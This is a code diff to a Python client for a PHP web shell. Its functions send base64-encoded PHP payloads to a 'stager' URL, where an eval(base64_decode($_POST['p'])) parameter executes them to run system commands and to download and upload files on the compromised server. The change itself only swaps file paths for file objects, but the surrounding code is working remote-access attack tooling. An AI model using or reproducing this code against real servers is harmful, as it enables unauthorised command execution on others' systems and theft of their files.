@@ -27,21 +27,20 @@ def execute_system(stager_url: str, command: str) -> str:
     return r.text
 
 
-def download_file(stager_url: str, remote_path: str, local_path: str, param: str = 'c'):
+def download_file(stager_url: str, remote_path: str, file: object, param: str = 'c'):
     payload = base64.b64encode(DOWNLOAD_PAYLOAD.encode()).decode()
 
     with requests.post(stager_url, params={param: f"eval(base64_decode($_POST['p']));", 'file': remote_path},
                        data={'p': payload}, stream=True) as r:
         r.raise_for_status()
-        with open(local_path, 'wb') as f:
+        with file as f:
             for chunk in r.iter_content(chunk_size=8192):
                 f.write(chunk)
 
 
-def upload_file(stager_url: str, local_path: str, remote_path: str, param: str = 'c') -> bool:
+def upload_file(stager_url: str, file: object, remote_path: str, param: str = 'c') -> bool:
     payload = base64.b64encode(UPLOAD_PAYLOAD.encode()).decode()
 
-    file = open(local_path, 'rb')
     r = requests.post(stager_url, params={param: f"eval(base64_decode($_POST['p']));", 'n': remote_path},
                       data={'p': payload},
                       files={'file': file})
